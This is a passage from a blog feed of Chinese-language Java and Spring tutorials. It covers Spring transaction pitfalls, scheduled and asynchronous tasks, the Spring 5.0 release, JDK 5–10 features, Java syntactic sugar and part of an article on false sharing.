href="https://mp.weixin.qq.com/s/RTEMPBB6AFmmdj0uw1SDsg">事务隔离级别和传播机制</a>》这篇文章。</p><p>都主动不支持以事务方式运行了，那事务生效也是白搭！</p><h4 id="7、异常被吃了"><a href="#7、异常被吃了" class="headerlink" title="7、异常被吃了"></a>7、异常被吃了</h4><p>这个也是出现比较多的场景：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; @Servicepublic class OrderServiceImpl implements OrderService &#123;    @Transactional    public void updateOrder(Order order) &#123;        try &#123;            &#x2F;&#x2F; update order        &#125; catch &#123;                    &#125;    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把异常吃了，然后又不抛出来，事务怎么回滚吧！</p><h4 id="8、异常类型错误"><a href="#8、异常类型错误" class="headerlink" title="8、异常类型错误"></a>8、异常类型错误</h4><p>上面的例子再抛出一个异常：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; @Servicepublic class OrderServiceImpl implements OrderService &#123;    @Transactional    public void updateOrder(Order order) &#123;        try &#123;            &#x2F;&#x2F; update order        &#125; catch &#123;            throw new Exception(&quot;更新错误&quot;);        &#125;    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样事务也是不生效的，因为默认回滚的是：RuntimeException，如果你想触发其他异常的回滚，需要在注解上配置一下，如：</p><pre class="line-numbers language-none"><code class="language-none">@Transactional(rollbackFor &#x3D; Exception.class)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个配置仅限于 <code>Throwable</code> 异常类及其子类。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本文总结了八种事务失效的场景，其实发生最多就是自身调用、异常被吃、异常抛出类型不对这三个了。</p><p>也像文章开头说的那样，本文不一定总结得全，只是总结常见的事务失效的场景，即使如此，这 8 点已经足以帮你吊打面试官了，如果你还知道其他场景也欢迎留言分享。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring 快速开启计划任务</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20%E5%BF%AB%E9%80%9F%E5%BC%80%E5%90%AF%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20%E5%BF%AB%E9%80%9F%E5%BC%80%E5%90%AF%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>Spring3.1开始让计划任务变得非常简单，只需要几个注解就能快速开启计划任务的支持。</p><h2 id="EnableScheduling"><a href="#EnableScheduling" class="headerlink" title="@EnableScheduling"></a>@EnableScheduling</h2><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Import(SchedulingConfiguration.class)@Documentedpublic @interface EnableScheduling &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@EnableScheduling、@Configuration两个同时使用开启计划任务支持。</p><pre class="line-numbers language-none"><code class="language-none">import org.springframework.context.annotation.Configuration;import org.springframework.scheduling.annotation.EnableScheduling;@EnableScheduling@Configurationpublic class TaskConfiguration &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Scheduled"><a href="#Scheduled" class="headerlink" title="@Scheduled"></a>@Scheduled</h2><p>在要使用计划任务的方法上使用Scheduled，fixedRate表示固定频率，cron即自定义执行表达式，更多用法参考注解@Scheduled参数。</p><pre class="line-numbers language-none"><code class="language-none">@Servicepublic class TestTask &#123;protected Logger logger &#x3D; LoggerUtils.getLogger(this);@Scheduled(fixedRate &#x3D; 5000)public void runPerFiveSeconds() &#123;logger.info(&quot;fix&quot;);&#125;@Scheduled(cron &#x3D; &quot;0&#x2F;10 * 9 * * ?&quot;)public void runCron() &#123;logger.info(&quot;cron&quot;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring 开启方法异步执行</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20%E5%BC%80%E5%90%AF%E6%96%B9%E6%B3%95%E5%BC%82%E6%AD%A5%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20%E5%BC%80%E5%90%AF%E6%96%B9%E6%B3%95%E5%BC%82%E6%AD%A5%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="EnableAsync"><a href="#EnableAsync" class="headerlink" title="@EnableAsync"></a>@EnableAsync</h2><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(AsyncConfigurationSelector.class)public @interface EnableAsync &#123;Class&lt;? extends Annotation&gt; annotation() default Annotation.class;boolean proxyTargetClass() default false;AdviceMode mode() default AdviceMode.PROXY;int order() default Ordered.LOWEST_PRECEDENCE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@EnableAsync注解即开启Spring对方法异步执行的能力，需要和注解@Configuration配合使用。</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@EnableAsyncpublic class AppConfig &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以自定义线程池</p><pre class="line-numbers language-none"><code class="language-none">@Configuration @EnableAsync public class AppConfig implements AsyncConfigurer &#123;     @Override     public Executor getAsyncExecutor() &#123;         ThreadPoolTaskExecutor executor &#x3D; new ThreadPoolTaskExecutor();         executor.setCorePoolSize(7);         executor.setMaxPoolSize(42);         executor.setQueueCapacity(11);         executor.setThreadNamePrefix(&quot;MyExecutor-&quot;);         executor.initialize();         return executor;     &#125;     @Override     public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler() &#123;         return MyAsyncUncaughtExceptionHandler();     &#125; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Async"><a href="#Async" class="headerlink" title="@Async"></a>@Async</h2><pre class="line-numbers language-none"><code class="language-none">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface Async &#123;String value() default &quot;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在要异步执行的方法上使用@Async注解，下面是一个没有返回值，一个带有返回值的异步调用的示例。</p><pre class="line-numbers language-none"><code class="language-none">@Componentpublic class AsyncTask &#123;@Asyncpublic void task1() &#123;try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;@Asyncpublic Future&lt;String&gt; task2() &#123;try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;return new AsyncResult&lt;String&gt;(&quot;javastack&quot;);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试代码</p><pre class="line-numbers language-none"><code class="language-none">@RunWith(SpringRunner.class)@SpringBootTestpublic class AsyncTest &#123;private final static Logger log &#x3D; LoggerFactory.getLogger(AsyncTest.class);@Autowiredprivate AsyncTask asyncTask;@Testpublic void testTask1()&#123;log.info(&quot;start&quot;);asyncTask.task1();log.info(&quot;finish&quot;);&#125;@Testpublic void testTask2()  &#123;log.info(&quot;start&quot;);Future&lt;String&gt; future &#x3D; asyncTask.task2();while (true) &#123;if (future.isDone()) &#123;try &#123;log.info(&quot;result is &quot; + future.get());&#125; catch (Exception e) &#123;e.printStackTrace();&#125; break;&#125;&#125;log.info(&quot;finish&quot;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h5 id="1、使用注意"><a href="#1、使用注意" class="headerlink" title="1、使用注意"></a>1、使用注意</h5><p>@Async只能使用到被代理的对象方法上，即代理类的入口方法处，且方法必须是public的。</p><h5 id="2、事务处理机制"><a href="#2、事务处理机制" class="headerlink" title="2、事务处理机制"></a>2、事务处理机制</h5><p>使用@Async异步注解不能和@Transaction事务注解在同一个方法上同时使用，不然事务注解将无效。</p><p>要使用事务，需要把事务注解提取到方法里面的子方法上。</p><p>欢迎大家转发到朋友圈，和朋友们一起提升自己。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终于，Spring 5.0 正式发布了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/%E7%BB%88%E4%BA%8E%EF%BC%8CSpring%205.0%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/%E7%BB%88%E4%BA%8E%EF%BC%8CSpring%205.0%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-5-0都有什么新功能？"><a href="#Spring-5-0都有什么新功能？" class="headerlink" title="Spring 5.0都有什么新功能？"></a>Spring 5.0都有什么新功能？</h2><p>1、最低要求支持JDK8+, J2EE 7+。</p><p>2、移除了一些包、类及方法。</p><p>3、核心功能加强：全面应用jdk8并兼容jdk9等。</p><p>4、SpringMVC：支持servlet4.0、Reactor 3.1等。</p><p>5、支持响应式堆栈web框架Spring WebFlux。</p><p>6、支持kotlin。</p><p>7、加强了测试：完美支持Junit5等。</p><h2 id="Spring-5-0下载"><a href="#Spring-5-0下载" class="headerlink" title="Spring 5.0下载"></a>Spring 5.0下载</h2><p>Maven:</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-context&lt;&#x2F;artifactId&gt;    &lt;version&gt;5.0.0.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Gradle:</p><pre class="line-numbers language-none"><code class="language-none">compile group: &#39;org.springframework&#39;, name: &#39;spring-context&#39;, version: &#39;5.0.0.RELEASE&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>Spring首页:</p><blockquote><p><a href="http://projects.spring.io/spring-framework/">http://projects.spring.io/spring-framework/</a></p></blockquote><p>新功能详情：</p><blockquote><p><a href="https://github.com/spring-projects/spring-framework/wiki/What's-New-in-the-Spring-Framework#whats-new-in-spring-framework-5x">https://github.com/spring-projects/spring-framework/wiki/What&#39;s-New-in-the-Spring-Framework#whats-new-in-spring-framework-5x</a></p></blockquote><p>最新的参考文档:</p><blockquote><p><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/">https://docs.spring.io/spring/docs/current/spring-framework-reference/</a></p></blockquote><p>发布说明</p><blockquote><p><a href="https://spring.io/blog/2017/09/28/spring-framework-5-0-goes-ga">https://spring.io/blog/2017/09/28/spring-framework-5-0-goes-ga</a></p></blockquote><p>如何迁移</p><blockquote><p><a href="https://github.com/spring-projects/spring-framework/wiki/Migrating-to-Spring-Framework-5.x">https://github.com/spring-projects/spring-framework/wiki/Migrating-to-Spring-Framework-5.x</a></p></blockquote><p>源码：</p><blockquote><p><a href="https://github.com/spring-projects/spring-framework">https://github.com/spring-projects/spring-framework</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 5 ~ 10 新特性倾情整理！</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java%205%20~%2010%20%E6%96%B0%E7%89%B9%E6%80%A7%E5%80%BE%E6%83%85%E6%95%B4%E7%90%86%EF%BC%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java%205%20~%2010%20%E6%96%B0%E7%89%B9%E6%80%A7%E5%80%BE%E6%83%85%E6%95%B4%E7%90%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近连 JDK11都在准备发布的路上了，大家都整明白了吗？也许现在大部分人还在用6-8，8的新特性都没用熟，9刚出不久，10-11就不用说了。</p><p>为了大家对JDK有一个全面的了解，下面我为大家整理了JDK5~10的所有关键新特性！</p><p><strong>JDK5新特性</strong></p><ul><li>自动装箱与拆箱</li><li>枚举</li><li>静态导入</li><li>可变参数（Varargs）</li><li>内省（introspector）</li><li>泛型（Generic）</li><li>For-Each循环</li></ul><p><strong>JDK6新特性</strong></p><ul><li>Desktop类和SystemTray类</li><li>使用JAXB2来实现对象与XML之间的映射</li><li>理解STAX</li><li>使用Compiler API</li><li>轻量级 Http Server API</li><li>插入式注解处理 API</li><li>使用Console开发控制台程序</li><li>对脚本语言的支持</li><li>Common Annotations</li><li>Java GUI界面的显示</li><li>嵌入式数据库Derby</li><li>Web服务元数据</li><li>Jtable的排序和过滤</li><li>更简单更强大的JAX-WS</li></ul><p><strong>JDK7新特性</strong></p><ul><li>switch中可以使用字符串了</li><li>泛型实例化类型自动推断</li><li>自定义自动关闭类</li><li>新增一些读取环境信息的工具方法</li><li>Boolean类型反转，空指针安全，参与位运算</li><li>两个char之间的equals</li><li>安全的加减乘除|sd</li><li>对Java集合( Collections）的增强支持</li><li>数值可加下划线</li><li>支持二进制数字</li><li>在try&#x2F;catch异常扑捉中，一个catch可以写多个异常类型用|隔开</li><li>可以不必要写finally语句来关闭资源，只要你在try()的括号内部定义要使用的资源</li></ul><p><strong>JDK8新特性</strong></p><ul><li>接口的默认方法</li><li>Lambda表达式</li><li>函数式接口</li><li>方法与构造函数引用</li><li>扩展了集合类</li><li>新的Date API</li><li>Annotation多重注解</li><li>streams（流）</li><li>parallel streams(并行流)</li><li>Map数据结构改进</li></ul><p><strong>JDK9新特性</strong></p><ul><li>Jigsaw模块化项目</li><li>简化进程API</li><li>轻量级JSON API</li><li>钱和货币的API</li><li>改善锁竞争机制</li><li>代码分段缓存</li><li>智能java编译</li><li>http2.0客户端</li><li>kulla计划</li></ul><p><strong>JDK10新特性</strong></p><ul><li>局部变量的类型推断</li><li>GC改进和内存管理</li><li>线程本地握手</li><li>备用内存设备上的堆分配</li><li>其他Unicode语言 - 标记扩展</li><li>基于Java的实验性JIT编译器</li><li>开源根证书</li><li>根证书颁发认证（CA）</li><li>将JDK生态整合单个存储库</li><li>删除工具javah</li></ul><p>怎么样，这些新特性都知道多少？都用过多少？多学习这些新特性，对写代码的效率、逼格、技能成长、就业还是会很有帮助的。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中的 6 颗语法糖</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%206%20%E9%A2%97%E8%AF%AD%E6%B3%95%E7%B3%96/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%206%20%E9%A2%97%E8%AF%AD%E6%B3%95%E7%B3%96/</url>
      
        <content type="html"><![CDATA[<p>语法糖（Syntactic Sugar），也称糖衣语法，指在计算机语言中添加的某种语法，这种语法对语言本身功能来说没有什么影响，只是为了方便程序员的开发，提高开发效率。说白了，语法糖就是对现有语法的一个封装。</p><p>Java作为一种与平台无关的高级语言，当然也含有语法糖，这些语法糖并不被虚拟机所支持，在编译成字节码阶段就自动转换成简单常用语法。</p><p><strong>一般来说Java中的语法糖主要有以下几种：</strong> </p><ol><li>泛型与类型擦除 </li><li>自动装箱与拆箱</li><li>变长参数</li><li>增强for循环 </li><li>内部类</li><li>枚举类</li></ol><p><strong>泛型与类型擦除</strong></p><p>Java语言并不是一开始就支持泛型的。在早期的JDK中，只能通过Object类是所有类型的父类和强制类型转换来实现泛型的功能。强制类型转换的缺点就是把编译期间的问题延迟到运行时，JVM并不能为我们提供编译期间的检查。</p><p>在JDK1.5中，Java语言引入了泛型机制。但是这种泛型机制是通过类型擦除来实现的，即Java中的泛型只在程序源代码中有效（源代码阶段提供类型检查），在编译后的字节码中自动用强制类型转换进行替代。也就是说，Java语言中的泛型机制其实就是一颗语法糖，相较与C++、C#相比，其泛型实现实在是不那么优雅。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;*** 在源代码中存在泛型*&#x2F;public static void main(String[] args) &#123;    Map&lt;String,String&gt; map &#x3D; new HashMap&lt;String,String&gt;();    map.put(&quot;hello&quot;,&quot;你好&quot;);    String hello &#x3D; map.get(&quot;hello&quot;);    System.out.println(hello);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当上述源代码被编译为class文件后，泛型被擦除且引入强制类型转换</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    HashMap map &#x3D; new HashMap(); &#x2F;&#x2F;类型擦除    map.put(&quot;hello&quot;, &quot;你好&quot;);    String hello &#x3D; (String)map.get(&quot;hello&quot;);&#x2F;&#x2F;强制转换    System.out.println(hello);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>自动装箱与拆箱</strong></p><p>Java中的自动装箱与拆箱指的是基本数据类型与他们的包装类型之间的相互转换。</p><p>我们知道Java是一门面向对象的语言，在Java世界中有一句话是这么说的：“万物皆对象”。但是Java中的基本数据类型却不是对象，他们不需要进行new操作，也不能调用任何方法，这在使用的时候有诸多不便。因此Java为这些基本类型提供了包装类，并且为了使用方便，提供了自动装箱与拆箱功能。自动装箱与拆箱在使用的过程中，其实是一个语法糖，内部还是调用了相应的函数进行转换。</p><p>下面代码演示了自动装箱和拆箱功能</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    Integer a &#x3D; 1;    int b &#x3D; 2;    int c &#x3D; a + b;    System.out.println(c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过编译后，代码如下</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    Integer a &#x3D; Integer.valueOf(1); &#x2F;&#x2F; 自动装箱    byte b &#x3D; 2;    int c &#x3D; a.intValue() + b;&#x2F;&#x2F;自动拆箱    System.out.println(c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>变长参数</strong></p><p>所谓变长参数，就是方法可以接受长度不定确定的参数。变长参数特性是在JDK1.5中引入的，使用变长参数有两个条件，一是变长的那一部分参数具有相同的类型，二是变长参数必须位于方法参数列表的最后面。变长参数同样是Java中的语法糖，其内部实现是Java数组。</p><pre class="line-numbers language-none"><code class="language-none">public class Varargs &#123;    public static void print(String... args) &#123;        for(String str : args)&#123;            System.out.println(str);        &#125;    &#125;    public static void main(String[] args) &#123;        print(&quot;hello&quot;, &quot;world&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译为class文件后如下，从中可以很明显的看出变长参数内部是通过数组实现的</p><pre class="line-numbers language-none"><code class="language-none">public class Varargs &#123;    public Varargs() &#123;    &#125;    public static void print(String... args) &#123;        String[] var1 &#x3D; args;        int var2 &#x3D; args.length;        &#x2F;&#x2F;增强for循环的数组实现方式        for(int var3 &#x3D; 0; var3 &lt; var2; ++var3) &#123;            String str &#x3D; var1[var3];            System.out.println(str);        &#125;    &#125;    public static void main(String[] args) &#123;        &#x2F;&#x2F;变长参数转换为数组        print(new String[]&#123;&quot;hello&quot;, &quot;world&quot;&#125;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>增强for循环</strong></p><p>增强for循环与普通for循环相比，功能更强并且代码更简洁。增强for循环的对象要么是一个数组，要么实现了Iterable接口。这个语法糖主要用来对数组或者集合进行遍历，其在循环过程中不能改变集合的大小。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    String[] params &#x3D; new String[]&#123;&quot;hello&quot;,&quot;world&quot;&#125;;    &#x2F;&#x2F;增强for循环对象为数组    for(String str : params)&#123;        System.out.println(str);    &#125;    List&lt;String&gt; lists &#x3D; Arrays.asList(&quot;hello&quot;,&quot;world&quot;);    &#x2F;&#x2F;增强for循环对象实现Iterable接口    for(String str : lists)&#123;        System.out.println(str);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后的class文件为</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;   String[] params &#x3D; new String[]&#123;&quot;hello&quot;, &quot;world&quot;&#125;;   String[] lists &#x3D; params;   int var3 &#x3D; params.length;   &#x2F;&#x2F;数组形式的增强for退化为普通for   for(int str &#x3D; 0; str &lt; var3; ++str) &#123;       String str1 &#x3D; lists[str];       System.out.println(str1);   &#125;   List var6 &#x3D; Arrays.asList(new String[]&#123;&quot;hello&quot;, &quot;world&quot;&#125;);   Iterator var7 &#x3D; var6.iterator();   &#x2F;&#x2F;实现Iterable接口的增强for使用iterator接口进行遍历   while(var7.hasNext()) &#123;       String var8 &#x3D; (String)var7.next();       System.out.println(var8);   &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>内部类</strong></p><p>内部类就是定义在一个类内部的类<br>Java语言中之所以引入内部类，是因为有些时候一个类只在另一个类中有用，我们不想让其在另外一个地方被使用。内部类之所以是语法糖，是因为其只是一个编译时的概念，一旦编译完成，编译器就会为内部类生成一个单独的class文件，名为outer$innter.class。</p><pre class="line-numbers language-none"><code class="language-none">public class Outer &#123;    class Inner&#123;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用javac编译后，生成两个class文件Outer.class和Outer$Inner.class，其中Outer$Inner.class的内容如下：</p><pre class="line-numbers language-none"><code class="language-none">class Outer$Inner &#123;    Outer$Inner(Outer var1) &#123;        this.this$0 &#x3D; var1;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内部类分为四种：成员内部类、局部内部类、匿名内部类、静态内部类，每一种都有其用法，这里就不介绍了</p><p><strong>枚举类型</strong></p><p>枚举类型就是一些具有相同特性的类常量<br>java中类的定义使用class，枚举类的定义使用enum。在Java的字节码结构中，其实并没有枚举类型，枚举类型只是一个语法糖，在编译完成后被编译成一个普通的类。这个类继承java.lang.Enum，并被final关键字修饰。</p><pre class="line-numbers language-none"><code class="language-none">public enum Fruit &#123;    APPLE,ORINGE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用jad对编译后的class文件进行反编译后得到：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;继承java.lang.Enum并声明为finalpublic final class Fruit extends Enum&#123;    public static Fruit[] values()    &#123;        return (Fruit[])$VALUES.clone();    &#125;    public static Fruit valueOf(String s)    &#123;        return (Fruit)Enum.valueOf(Fruit, s);    &#125;    private Fruit(String s, int i)    &#123;        super(s, i);    &#125;    &#x2F;&#x2F;枚举类型常量    public static final Fruit APPLE;    public static final Fruit ORANGE;    private static final Fruit $VALUES[];&#x2F;&#x2F;使用数组进行维护    static    &#123;        APPLE &#x3D; new Fruit(&quot;APPLE&quot;, 0);        ORANGE &#x3D; new Fruit(&quot;ORANGE&quot;, 1);        $VALUES &#x3D; (new Fruit[] &#123;            APPLE, ORANGE        &#125;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Java远不止这些语法糖，JDK7、JDK8添加的新特性都有很多高级的语法糖。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中的伪共享详解及解决方案</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%E4%BC%AA%E5%85%B1%E4%BA%AB%E8%AF%A6%E8%A7%A3%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%E4%BC%AA%E5%85%B1%E4%BA%AB%E8%AF%A6%E8%A7%A3%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h4 id="1-什么是伪共享"><a href="#1-什么是伪共享" class="headerlink" title="1. 什么是伪共享"></a>1. 什么是伪共享</h4><p>CPU 缓存系统中是以缓存行（cache line）为单位存储的。目前主流的 CPU Cache 的 Cache Line 大小都是 64 Bytes。在多线程情况下，如果需要修改“共享同一个缓存行的变量”，就会无意中影响彼此的性能，这就是伪共享（False Sharing）。</p><h4 id="2-缓存行"><a href="#2-缓存行" class="headerlink" title="2. 缓存行"></a>2. 缓存行</h4><p>由于共享变量在 CPU 缓存中的存储是以缓存行为单位，一个缓存行可以存储多个变量（存满当前缓存行的字节数）；而CPU对缓存的修改又是以缓存行为最小单位的，那么就会出现上诉的伪共享问题。</p><p>Cache Line 可以简单的理解为 CPU Cache 中的最小缓存单位，今天的 CPU 不再是按字节访问内存，而是以 64 字节为单位的块(chunk)拿取，称为一个缓存行(cache line)。当你读一个特定的内存地址，整个缓存行将从主存换入缓存，并且访问同一个缓存行内的其它值的开销是很小的。</p><h4 id="3-CPU-的三级缓存"><a href="#3-CPU-的三级缓存" class="headerlink" title="3. CPU 的三级缓存"></a>3. CPU 的三级缓存</h4><p>由于 CPU 的速度远远大于内存速度，所以 CPU 设计者们就给 CPU 加上了缓存(CPU Cache)。 以免运算被内存速度拖累。（就像我们写代码把共享数据做Cache不想被DB存取速度拖累一样），CPU Cache 分成了三个级别：L1，L2，L3。越靠近CPU的缓存越快也越小。所 以L1 缓存很小但很快，并且紧靠着在使用它的 CPU 内核。L2 大一些，也慢一些，并且仍然只能被一个单独的 CPU 核使用。L3 在现代多核机器中更普遍，仍然更大，更慢，并且被单个插槽上的所有 CPU 核共享。最后，你拥有一块主存，由全部插槽上的所有 CPU 核共享。</p><p>当 CPU 执行运算的时候，它先去L1查找所需的数据，再去L2，然后是L3，最后如果这些缓存中都没有，所需的数据就要去主内存拿。走得越远，运算耗费的时间就越长。所以如果你在做一些很频繁的事，你要确保数据在L1缓存中。</p><p><img src="http://img.javastack.cn/18-5-31/91078691.jpg"></p><h4 id="4-缓存关联性"><a href="#4-缓存关联性" class="headerlink" title="4. 缓存关联性"></a>4. 缓存关联性</h4><p>目前常用的缓存设计是N路组关联(N-Way Set Associative Cache)，他的原理是把一个缓存按照N个 Cache Line 作为一组（Set），缓存按组划为等分。每个内存块能够被映射到相对应的set中的任意一个缓存行中。比如一个16路缓存，16个 Cache Line 作为一个Set，每个内存块能够被映射到相对应的 Set 中的16个 CacheLine 